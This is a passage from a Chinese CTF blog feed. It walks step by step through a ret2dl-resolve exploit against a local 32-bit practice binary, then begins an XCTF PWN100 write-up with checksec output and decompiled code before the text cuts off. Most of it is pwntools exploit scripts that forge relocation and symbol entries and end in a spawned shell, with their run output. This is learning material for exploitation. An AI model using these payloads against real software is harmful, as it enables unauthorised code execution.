class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：成功调用write函数并将/bin/sh打印出来</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ python test2.py <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49059Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><h3 id="step2："><a href="#step2：" class="headerlink" title="step2："></a>step2：</h3><p>这次控制eip返回PLT[0]，要带上write的index_offset。这里修改一下payload2</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>index_offset <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token comment" spellcheck="true">#write`s index from  objump -d -j .plt test2</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span><span class="token comment" spellcheck="true">#代替原来的p32(write_plt)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span></code></pre><p>结果成功调用write函数打印/bin/sh</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49114Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><h3 id="step3"><a href="#step3" class="headerlink" title="step3:"></a>step3:</h3><p>控制index_offset，指向我们构造的fake_reloc</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>r_info <span class="token operator">=</span> <span class="token number">0x607</span> <span class="token comment" spellcheck="true">#rel.plt of write --> r_info</span>fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> fake_relocpayload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：成功调用write函数并打印/bin/sh</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49177Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive</code></pre><h3 id="step4："><a href="#step4：" class="headerlink" title="step4："></a>step4：</h3><p>再进一步：构造fake——sym，使其指向我们控制的st_name</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是<span class="token number">0x10</span>字节大小align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align除以<span class="token number">0x10</span>因为Elf32_Sym结构体的大小为<span class="token number">0x10</span>，得到write的dynsym索引号index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>st_name <span class="token operator">=</span> <span class="token number">0x4c</span> <span class="token comment" spellcheck="true">#在synstr中的偏移</span>fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>alignpayload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：再次成功</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49247Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><h3 id="step5："><a href="#step5：" class="headerlink" title="step5："></a>step5：</h3><p>控制st_name指向字符串‘write’’</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> alignindex_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>st_name <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">-</span> dynstr <span class="token comment" spellcheck="true">#this 0x10 for the sizeof fake_sym_addr</span>fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>alignpayload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>payload2 <span class="token operator">+=</span> <span class="token string">'write\x00'</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：成功调用并打印</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49302Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><h3 id="step6"><a href="#step6" class="headerlink" title="step6:"></a>step6:</h3><p>替换write为system，并修改对应bss中的参数</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> alignindex_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>st_name <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">-</span> dynstr <span class="token comment" spellcheck="true">#this 0x10 for the sizeof fake_sym_addr</span>fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> <span class="token string">'aaaa'</span>payload2 <span class="token operator">+=</span> <span class="token string">'aaaa'</span>payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>alignpayload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>payload2 <span class="token operator">+=</span> <span class="token string">'system\x00'</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：获得shell</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49341Welcome to the Crazy World<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">whoami</span>hunter$  </code></pre><p>for more details ：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-PWN100</title>
      <link href="/2020/07/21/xctf-challenge-pwn100/"/>
      <url>/2020/07/21/xctf-challenge-pwn100/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge/pwn100$ checksec babystack<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/pwn100/babystack'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>差点保护全开，有点狠</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+98h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">sub_4008B9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 输出菜单</span>    v3 <span class="token operator">=</span> <span class="token function">sub_400841</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// 读取选项</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span 